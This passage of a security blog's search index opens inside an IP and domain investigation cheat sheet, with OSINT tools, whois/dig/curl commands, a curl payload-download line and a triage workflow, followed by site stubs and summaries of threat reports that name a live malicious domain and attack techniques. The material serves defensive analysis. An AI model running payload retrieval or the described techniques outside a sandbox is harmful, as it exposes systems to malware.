redirect chains Shodan Open ports, services, banners on public IPs Censys Asset discovery, certificates, services, open ports GreyNoise Identify noisy scanners vs targeted threats Browserling Safe website browsing and JS/redirect testing Spur.us Identify proxies, VPNs, hosting info SecurityTrails Historical DNS, WHOIS, subdomains Hunting.abuse.ch IOC feeds (URLhaus, MalwareBazaar) ExpandURL Reveal full destination of shortened/tracked URLs IPVoid Quick IP/domain blacklist check, ASN info WHOIS Ownership and registration information RiskIQ Passive DNS, WHOIS history, SSL certs (now merged into Microsoft Defender Threat Intelligence) SpeedGuide Port number references, commonly abused and service descriptions IP Classes and Ranges # Class Range Type CIDR Notation Notes A 1.0.0.0 – 9.255.255.255 Public 1.0.0.0/8 – 9.0.0.0/8 Public routable A (P) 10.0.0.0 – 10.255.255.255 Private 10.0.0.0/8 Private use A 11.0.0.0 – 126.255.255.255 Public 11.0.0.0/8 – 126.0.0.0/8 Public routable A 127.0.0.0 – 127.255.255.255 Special 127.0.0.0/8 Loopback addresses B 128.0.0.0 – 191.255.255.255 Mixed 128.0.0.0/16 – 191.255.0.0/16 Public and private ranges B (P) 172.16.0.0 – 172.31.255.255 Private 172.16.0.0/12 Private use C 192.0.0.0 – 223.255.255.255 Mixed 192.0.0.0/24 – 223.255.255.0/24 Public and private C (P) 192.168.0.0 – 192.168.255.255 Private 192.168.0.0/16 Private use D 224.0.0.0 – 239.255.255.255 Multicast 224.0.0.0/4 Not for general use E 240.0.0.0 – 255.255.255.255 Reserved 240.0.0.0/4 Research/experimental use CLI Commands # WHOIS + DNS # # WHOIS lookup whois example.com # DNS records (A, MX, TXT, CNAME) dig example.com ANY +short dig +trace example.com # Use alternative DNS resolver (Useful for internal DNS Servers) nslookup example.com 8.8.8.8 IP Geolocation + ASN # curl ipinfo.io/8.8.8.8 curl https://ipapi.co/8.8.8.8/json/ Historical WHOIS and Certificates # curl \u0026#34;https://crt.sh/?q=%.example.com\u0026amp;output=json\u0026#34; Curl Usage # ⚠️ Always perform payload retrieval in an VM with VPN enabled.\n# Download raw payload curl http://example.com/payload # View HTTP headers curl -I https://example.com # Follow redirects and trace curl -v -L https://short.url # Fetch page and convert to plaintext curl -s https://example.com | html2text # Custom headers - Some threat actors will perform \u0026#34;authentication\u0026#34; on their servers by using custom headers. curl https://example.com -A \u0026#34;CustomUserAgent\u0026#34; curl https://example.com -H \u0026#34;Header: value\u0026#34; curl https://example.com -b \u0026#34;cookie=value\u0026#34; curl https://example.com --referer \u0026#34;https://source.com\u0026#34; Suggested Workflow # Step 1: Initial Triage – Begin with URLScan.io or AbuseIPDB # For URLs: Use URLScan.io\nReview the screenshot and network tab Note any resource files and redirects Check for unusual behaviour (e.g. strange hosting, suspicious scripts) For IPs: Use AbuseIPDB\nCheck report history Look for associated abuse categories (e.g. brute force, phishing) Step 2: IP \u0026amp; Domain Reputation Checks # Query the IP or domain in:\nSpur.us IPVoid GreyNoise Hunting.abuse.ch Look for:\nKnown blacklists Cloud hosting services (e.g. AWS, Azure, GCP) Scanning or malicious behaviour reports Step 3: WHOIS Lookup # Use tools like\nwhois DomainTools SecurityTrails Look for:\nDomain creation/expiry dates Registrar details Registrant email (useful for pivoting to other domains) Step 4: Certificate \u0026amp; Passive DNS Analysis # Query:\nCensys crt.sh SecurityTrails Look for:\nSSL certificate reuse across domains Historical IP/domain associations Subdomain enumeration Step 5: VirusTotal Search # Use VirusTotal to search for domain or IP.\nCheck for:\nDetection engine results Behavioural graph and activity Related malicious files or domains Step 6: Retrieve Payloads # Use:\nBrowserling curl (in a VM with VPN) A browser (in a VM with VPN) Purpose:\nSafely interact with and collect potential payloads Observe dynamic behaviour without exposing your host system Behavioural Indicators # Type Suspicious Traits Domain New registration, strange TLDs, WHOIS privacy, typosquatting, homoglyphs IP Blacklisted, TOR exit node, cloud host, reverse DNS mismatch URL Shortened, base64-encoded params, IP-based URLs, excessive redirects DNS Fast-flux, wildcard abuse, TXT query abuse, NXDOMAIN spikes ✉️ For any domains/URLs shared with colleagues, consider defanging (e.g., hxxp://malicious[.]site) to prevent accidental clicks.\n","date":"27 June 2025","externalUrl":null,"permalink":"/posts/ip_domain_investigation_cheat-sheet/","section":"Blog","summary":"Essential techniques for IP and domain investigations including reputation checks, WHOIS lookups, DNS inspection, passive intelligence, and payload retrieval for threat hunting and incident response.","title":"IP \u0026 Domain Investigation Cheat Sheet","type":"posts"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/series/basics/","section":"Series","summary":"","title":"Basics","type":"series"},{"content":"This blog is where I document my work, thoughts, and experiments across cybersecurity, reverse engineering, malware analysis, and the occasional hardware rabbit hole. You\u0026rsquo;ll find technical deep-dives, tooling walkthroughs, cheat sheet updates, and notes from the front lines of SOC operations and malware analysis. Most posts come from real-world experience whether it\u0026rsquo;s triaging incidents, dissecting malware, or automating the boring stuff.\n","date":"17 February 2026","externalUrl":null,"permalink":"/posts/","section":"Blog","summary":"This blog is where I document my work, thoughts, and experiments across cybersecurity, reverse engineering, malware analysis, and the occasional hardware rabbit hole. You’ll find technical deep-dives, tooling walkthroughs, cheat sheet updates, and notes from the front lines of SOC operations and malware analysis. Most posts come from real-world experience whether it’s triaging incidents, dissecting malware, or automating the boring stuff.\n","title":"Blog","type":"posts"},{"content":"Welcome to my corner of the internet where I document malware analysis, SOC operations, and all things cyber. Beyond dissecting malware, I\u0026rsquo;m passionate about teaching and growing the cybersecurity community. Whether you\u0026rsquo;re starting your journey or deep in the trenches, I hope you find something here that helps you level up.\n","date":"17 February 2026","externalUrl":null,"permalink":"/","section":"Ctrl+Alt+Dark","summary":"Welcome to my corner of the internet where I document malware analysis, SOC operations, and all things cyber. Beyond dissecting malware, I’m passionate about teaching and growing the cybersecurity community. Whether you’re starting your journey or deep in the trenches, I hope you find something here that helps you level up.\n","title":"Ctrl+Alt+Dark","type":"page"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/tags/dfir/","section":"Tags","summary":"","title":"Dfir","type":"tags"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/tags/guide/","section":"Tags","summary":"","title":"Guide","type":"tags"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/tags/incident-response/","section":"Tags","summary":"","title":"Incident-Response","type":"tags"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/tags/methodology/","section":"Tags","summary":"","title":"Methodology","type":"tags"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","date":"17 February 2026","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/ai/","section":"Tags","summary":"","title":"Ai","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/series/curiosity-crisis/","section":"Series","summary":"","title":"Curiosity Crisis","type":"series"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/education/","section":"Tags","summary":"","title":"Education","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/flashcards/","section":"Tags","summary":"","title":"Flashcards","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/learning/","section":"Tags","summary":"","title":"Learning","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/notebooklm/","section":"Tags","summary":"","title":"Notebooklm","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/study-techniques/","section":"Tags","summary":"","title":"Study-Techniques","type":"tags"},{"content":"","date":"24 January 2026","externalUrl":null,"permalink":"/tags/workflow/","section":"Tags","summary":"","title":"Workflow","type":"tags"},{"content":"","date":"22 January 2026","externalUrl":null,"permalink":"/tags/critical-thinking/","section":"Tags","summary":"","title":"Critical-Thinking","type":"tags"},{"content":"","date":"21 December 2025","externalUrl":null,"permalink":"/tags/cheatsheet/","section":"Tags","summary":"","title":"Cheatsheet","type":"tags"},{"content":"","date":"21 December 2025","externalUrl":null,"permalink":"/series/cheatsheets/","section":"Series","summary":"","title":"Cheatsheets","type":"series"},{"content":"","date":"21 December 2025","externalUrl":null,"permalink":"/tags/mssql/","section":"Tags","summary":"","title":"Mssql","type":"tags"},{"content":"","date":"21 December 2025","externalUrl":null,"permalink":"/tags/threat-hunting/","section":"Tags","summary":"","title":"Threat-Hunting","type":"tags"},{"content":"","date":"3 December 2025","externalUrl":null,"permalink":"/tags/external/","section":"Tags","summary":"","title":"External","type":"tags"},{"content":" Investigation Summary # Huntress identified three interconnected incidents where threat actors transformed Velociraptor, a powerful digital forensics and incident response tool, into a malicious command-and-control framework. The investigations revealed sophisticated post-exploitation techniques and shared infrastructure across multiple compromises.\nAttack Methodology:\nInitial access via SharePoint vulnerabilities (CVE-2025-49706, CVE-2025-49704) and WSUS exploitation Web shell deployment in SharePoint directories for persistent access Velociraptor installed as Windows service for legitimate-looking C2 communication Cloudflare tunnel domains used to mask command-and-control traffic Base64-encoded PowerShell commands for evasion Deployment of Visual Studio Code, OpenSSH, and TightVNC for redundant access channels Key Findings:\nMultiple incidents shared the same download domain (royal-boat-bf05.qgtxtebl.workers.dev) and Cloudflare infrastructure One incident connected to Storm-2603 threat cluster, culminating in Warlock ransomware Threat actors made operational errors including failed command syntax and Linux commands on Windows systems Creation of unauthorized administrative accounts across compromised environments Defense Recommendations: Organizations should patch SharePoint and WSUS vulnerabilities immediately, establish baseline software inventories, monitor for suspicious Velociraptor instances, and implement comprehensive EDR logging.\nRead the full article on Huntress →\n","date":"3 December 2025","externalUrl":"https://www.huntress.com/blog/velociraptor-misuse-part-two-eye-of-the-storm","permalink":"/about/velociraptor-misuse-huntress/","section":"Whoami","summary":"Investigation uncovered three distinct incidents where threat actors weaponized Velociraptor, a legitimate DFIR tool, for persistent command-and-control access. Attackers exploited SharePoint and WSUS vulnerabilities, installed Velociraptor as a Windows service communicating through Cloudflare tunnels, and deployed secondary tools including VS Code, OpenSSH, and TightVNC. One incident linked to Storm-2603 resulted in Warlock ransomware deployment.","title":"Huntress - Weaponized Velociraptor Delivers Ransomware","type":"about"},{"content":"","date":"3 December 2025","externalUrl":null,"permalink":"/tags/velociraptor/","section":"Tags","summary":"","title":"Velociraptor","type":"tags"},{"content":" Attack Chain Analysis # What initially appeared as a standard Python-based infostealer campaign revealed itself as a sophisticated, multi-stage operation deploying PureRAT, a full-featured commercial remote access trojan. The investigation uncovered a Vietnamese threat actor\u0026rsquo;s evolution from amateur operations to deploying commodity malware with advanced capabilities.\nAttack Progression:\nInitial Vector: Phishing email with ZIP archive disguised as copyright infringement notice DLL Sideloading: Legitimate signed PDF reader executable loading malicious version.dll 10-Stage Chain: Progressive layering of payloads with increasing complexity and obfuscation In-Memory Execution: Multiple loaders executing entirely in memory to evade detection Defense Evasion: Multi-layer obfuscation, certutil abuse, and WMI queries Final Payload: PureRAT with TLS/SSL-encrypted C2 communication PureRAT Capabilities:\nHidden desktop access (HVNC/HRDP) for undetectable remote control Webcam and microphone surveillance Real-time and offline keylogging Remote command execution Application monitoring and manipulation Lightweight client with multilingual GUI Attribution: Recurring Telegram infrastructure, metadata linking to @LoneNone, and C2 servers traced to Vietnam strongly suggest this campaign was conducted by the PXA Stealer operators, demonstrating their progression from amateurish techniques to sophisticated, maturing tradecraft.\nDefense Challenge: The attack\u0026rsquo;s complexity means no single control could stop the entire chain. Organizations must monitor for specific behaviors including certutil abuse, WMI queries, and encrypted C2 traffic to build resilient detection capabilities.\nRead the full article on BleepingComputer →\n","date":"9 October 2025","externalUrl":"https://www.bleepingcomputer.com/news/security/from-infostealer-to-full-rat-dissecting-the-purerat-attack-chain/","permalink":"/about/purerat-bleepingcomputer/","section":"Whoami","summary":"Vietnamese threat actor behind PXA Stealer has evolved their capabilities, deploying a sophisticated 10-stage attack chain culminating in PureRAT—a commercial .NET remote access trojan. The campaign demonstrates tactical maturity with DLL sideloading, multi-layer obfuscation, in-memory execution, and progression from credential theft to full system surveillance including hidden desktop access, webcam/microphone spying, and real-time keylogging.","title":"BleepingComputer - PXA Stealer to PureRAT Deployment","type":"about"},{"content":"","date":"9 October 2025","externalUrl":null,"permalink":"/tags/malware-analysis/","section":"Tags","summary":"","title":"Malware-Analysis","type":"tags"},{"content":"","date":"9 October 2025","externalUrl":null,"permalink":"/tags/rat/","section":"Tags","summary":"","title":"Rat","type":"tags"},{"content":"","date":"9 October 2025","externalUrl":null,"permalink":"/tags/threat-intelligence/","section":"Tags","summary":"","title":"Threat-Intelligence","type":"tags"},{"content":"","date":"8 October 2025","externalUrl":null,"permalink":"/tags/china-nexus/","section":"Tags","summary":"","title":"China-Nexus","type":"tags"},{"content":"","date":"8 October 2025","externalUrl":null,"permalink":"/tags/open-source/","section":"Tags","summary":"","title":"Open-Source","type":"tags"},{"content":" Key Findings # Since at least June 2025, threat actors with suspected ties to China have been exploiting publicly exposed phpMyAdmin panels to compromise systems across East Asia. The attack demonstrates how legitimate open-source tools can be weaponized for malicious operations with plausible deniability.\nAttack Chain:\nExploited vulnerable phpMyAdmin panels for initial access Used log poisoning (log injection) to plant web shells on servers Leveraged SQL commands to execute PHP code recorded in log files Deployed Nezha agent to establish remote command and control Used PowerShell scripts to disable Microsoft Defender and launch Gh0st RAT Over 100 victim machines were compromised primarily across Taiwan, Japan, South Korea, and Hong Kong, with the threat actors operating their Nezha dashboard in Russian.\nRead the full article on The Hacker News →\n","date":"8 October 2025","externalUrl":"https://thehackernews.com/2025/10/chinese-hackers-weaponize-open-source.html","permalink":"/about/chinese-hackers-thehackernews/","section":"Whoami","summary":"Chinese-linked threat actors compromised over 100 systems across Taiwan, Japan, South Korea, and Hong Kong by weaponizing Nezha, an open-source monitoring tool, to deliver Gh0st RAT. The sophisticated attack chain exploited vulnerable phpMyAdmin panels using log poisoning techniques, deployed web shells via SQL injection, and used the Nezha agent for remote command execution before delivering the final payload.","title":"The Hacker News - Chinese threat actors weaponizing new tools","type":"about"},{"content":"","date":"3 September 2025","externalUrl":null,"permalink":"/tags/dotnet/","section":"Tags","summary":"","title":"Dotnet","type":"tags"},{"content":"","date":"3 September 2025","externalUrl":null,"permalink":"/series/pxa-stealer/","section":"Series","summary":"","title":"PXA Stealer","type":"series"},{"content":"","date":"3 September 2025","externalUrl":null,"permalink":"/tags/reverse-engineering/","section":"Tags","summary":"","title":"Reverse-Engineering","type":"tags"},{"content":"","date":"2 September 2025","externalUrl":null,"permalink":"/tags/dynamic-analysis/","section":"Tags","summary":"","title":"Dynamic-Analysis","type":"tags"},{"content":"","date":"1 September 2025","externalUrl":null,"permalink":"/tags/process-hollowing/","section":"Tags","summary":"","title":"Process-Hollowing","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/python/","section":"Tags","summary":"","title":"Python","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/telegram/","section":"Tags","summary":"","title":"Telegram","type":"tags"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/cryptography/","section":"Tags","summary":"","title":"Cryptography","type":"tags"},{"content":"","date":"29 August 2025","externalUrl":null,"permalink":"/tags/static-analysis/","section":"Tags","summary":"","title":"Static-Analysis","type":"tags"},{"content":"","date":"2 July 2025","externalUrl":null,"permalink":"/tags/detection-engineering/","section":"Tags","summary":"","title":"Detection-Engineering","type":"tags"},{"content":"","date":"2 July 2025","externalUrl":null,"permalink":"/tags/phishing/","section":"Tags","summary":"","title":"Phishing","type":"tags"},{"content":"","date":"2 July 2025","externalUrl":null,"permalink":"/tags/powershell/","section":"Tags","summary":"","title":"Powershell","type":"tags"},{"content":"","date":"2 July 2025","externalUrl":null,"permalink":"/tags/siem/","section":"Tags","summary":"","title":"Siem","type":"tags"},{"content":"","date":"2 July 2025","externalUrl":null,"permalink":"/tags/sigma/","section":"Tags","summary":"","title":"Sigma","type":"tags"},{"content":"","date":"1 July 2025","externalUrl":null,"permalink":"/tags/osint/","section":"Tags","summary":"","title":"Osint","type":"tags"},{"content":"","date":"1 July 2025","externalUrl":null,"permalink":"/tags/tool/","section":"Tags","summary":"","title":"Tool","type":"tags"},{"content":"","date":"28 June 2025","externalUrl":null,"permalink":"/tags/beginner/","section":"Tags","summary":"","title":"Beginner","type":"tags"},{"content":"","date":"28 June 2025","externalUrl":null,"permalink":"/tags/career/","section":"Tags","summary":"","title":"Career","type":"tags"},{"content":"","date":"28 June 2025","externalUrl":null,"permalink":"/tags/certifications/","section":"Tags","summary":"","title":"Certifications","type":"tags"},{"content":"","date":"28 June 2025","externalUrl":null,"permalink":"/tags/pattern-matching/","section":"Tags","summary":"","title":"Pattern-Matching","type":"tags"},{"content":"","date":"28 June 2025","externalUrl":null,"permalink":"/tags/regex/","section":"Tags","summary":"","title":"Regex","type":"tags"},{"content":"","date":"27 June 2025","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking","type":"tags"},{"content":"This space highlights a handful of personal and professional projects, from deep dives into malware internals to physical-layer tinkering, and the occasional development of tools/systems to simplify my life in a SOC. It’s a mix of discipline, obsession, and curiosity.\nLearning Series # Whether you\u0026rsquo;re just starting out or looking to fill in the gaps, this series walks through the fundamentals of cyber security in a practical, no-fluff way. Posts are written from real-world experience, not just textbooks.\nGetting Started in Cyber Security The Art of Investigation Theory in the Real World My Collection of Cheat Sheets # I maintain a collection of quick-reference cheat sheets covering day-to-day tasks in security operations and reverse engineering. They\u0026rsquo;re written to be direct, search-friendly, and focused on real-world tasks, not just theory. Many of these cheat sheets have been built on other people\u0026rsquo;s work. I have referenced them where necessary, but please go give them some love.\nWindows Event Logs Cheat Sheet Windows Registry Cheat Sheet Windows CLI Cheat Sheet macOS CLI Cheat Sheet IP and Domain Analysis Cheat Sheet Regex Cheat Sheet Markdown Cheat Sheet Malware Analysis Cheat Sheet Sigma Rule Cheat Sheet MSSQL Cheat Sheet Web Shell Cheat Sheet Malware Reversing Deep-dive # I spend a lot of time peeling apart malware, from packer identification and decryption routines to exploring obscure API misuse and behavioural quirks. Some efforts become full write-ups, others remain buried in folders named “why.exe” and “final_final_final_stage.ps1”.\nTradingView -\u0026gt; NetSupport RAT (Powershell) PXA Stealers Evolution to PureRAT (Python and .Net) Home Lab Shenanigans # What started as a “low-power mini lab” spiralled into a fully racked setup with virtualisation, vlan galore, and more cable management attempts than I care to admit. Projects range from Proxmox orchestration to 3d printing mounts and segmented malware sandboxes.\nMy Rack Setup - 2020 Extrusion DIY mini-rack Tooling and Automation Development # I’m constantly building small scripts, tools, and pipelines, usually to streamline SOC processes, threat hunting workflows, or analysis tasks. It’s part necessity, part therapy. Selected tools may appear on GitHub when they’re not too specific to internal environments.\nMy GitHub repo for soc-tools can be found here\nNetTriage: Domain and IP Triage DarkSIEM: Improves IppSec\\PowerSiem for Live Sysmon Alerting Hardware Hacking Experiments # From flashing routers to tapping into debug UARTs, I’ve got a soft spot for hardware that wasn’t meant to be messed with. A lot of these side quests blur the line between electronics and security research and that’s the fun of it.\nThis list is just a sample the real chaos lives in notebooks, git branches, and storage bins. More to come.\n","date":"19 June 2025","externalUrl":null,"permalink":"/topics/","section":"Ctrl+Alt+Dark","summary":"This space highlights a handful of personal and professional projects, from deep dives into malware internals to physical-layer tinkering, and the occasional development of tools/systems to simplify my life in a SOC. It’s a mix of discipline, obsession, and curiosity.\n","title":"Projects","type":"page"},{"content":"","date":"16 June 2025","externalUrl":null,"permalink":"/tags/macos/","section":"Tags","summary":"","title":"Macos","type":"tags"},{"content":"","date":"16 June 2025","externalUrl":null,"permalink":"/tags/terminal/","section":"Tags","summary":"","title":"Terminal","type":"tags"},{"content":"","date":"10 June 2025","externalUrl":null,"permalink":"/tags/documentation/","section":"Tags","summary":"","title":"Documentation","type":"tags"},{"content":"","date":"10 June 2025","externalUrl":null,"permalink":"/tags/markdown/","section":"Tags","summary":"","title":"Markdown","type":"tags"},{"content":"","date":"10 June 2025","externalUrl":null,"permalink":"/tags/reference/","section":"Tags","summary":"","title":"Reference","type":"tags"},{"content":"","date":"10 June 2025","externalUrl":null,"permalink":"/tags/writing/","section":"Tags","summary":"","title":"Writing","type":"tags"},{"content":"","date":"8 June 2025","externalUrl":null,"permalink":"/tags/cli/","section":"Tags","summary":"","title":"Cli","type":"tags"},{"content":"","date":"8 June 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"3 June 2025","externalUrl":null,"permalink":"/tags/registry/","section":"Tags","summary":"","title":"Registry","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/event-logs/","section":"Tags","summary":"","title":"Event-Logs","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/ghidra/","section":"Tags","summary":"","title":"Ghidra","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/pdf-analysis/","section":"Tags","summary":"","title":"Pdf-Analysis","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/remnux/","section":"Tags","summary":"","title":"Remnux","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/unpacking/","section":"Tags","summary":"","title":"Unpacking","type":"tags"},{"content":"","date":"2 June 2025","externalUrl":null,"permalink":"/tags/x64dbg/","section":"Tags","summary":"","title":"X64dbg","type":"tags"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/hardware/","section":"Tags","summary":"","title":"Hardware","type":"tags"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/series/home-lab/","section":"Series","summary":"","title":"Home Lab","type":"series"},{"content":"","date":"28 May 2025","externalUrl":null,"permalink":"/tags/homelab/","section":"Tags","summary":"","title":"Homelab","type":"tags"},{"content":" James Northey (aka. Darkrym) # With six years of practical experience in cybersecurity, I’ve worked across a broad range of disciplines, from incident response and digital forensics to vulnerability assessments and security operations spanning both enterprise systems and operational environments.\nUntil recently, I worked for the Security Operations Centre supporting Australia\u0026rsquo;s fourth-largest network. Where I focused heavily on large-scale monitoring, threat detection, and coordinated response efforts within complex enterprise and operational environments.\nBut I’m excited to share that I’ve joined Huntress. I am having a blast working with a highly skilled team, diving deeper into adversary tradecraft, analysing malware campaigns in the wild, and contributing to clean-up efforts that all have real-world impact. It’s a fast-paced environment that keeps me on my toes, perfect for someone who thrives on curiosity, continuous learning, and creative problem-solving.\nWhat drives me most, however, is the challenge of malware reverse engineering. It combines deep analysis with creative problem-solving, a space where I thrive. Each new sample is a puzzle that pushes my abilities further and further while feeding my curiosity, making it the most rewarding aspect of my work in cybersecurity.\nFeel free to explore the site to learn more or connect if you\u0026rsquo;re interested in anything I discuss or just keen for a chat.\nDisclaimer: The views, opinions, and ideas expressed on this website are entirely my own and do not reflect those of my current or past employers.\nExternal Publications # ","date":"9 April 2014","externalUrl":null,"permalink":"/about/","section":"Whoami","summary":"James Northey (aka. Darkrym) # With six years of practical experience in cybersecurity, I’ve worked across a broad range of disciplines, from incident response and digital forensics to vulnerability assessments and security operations spanning both enterprise systems and operational environments.\n","title":"Whoami","type":"about"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"Quick-reference guides for security operations, threat hunting, DFIR, and daily engineering tasks. Written to be direct and focused on real-world use — not just theory.\n","externalUrl":null,"permalink":"/cheat-sheets/","section":"Cheat Sheets","summary":"Quick-reference guides for security operations, threat hunting, DFIR, and daily engineering tasks. Written to be direct and focused on real-world use — not just theory.\n","title":"Cheat Sheets","type":"cheat-sheets"}]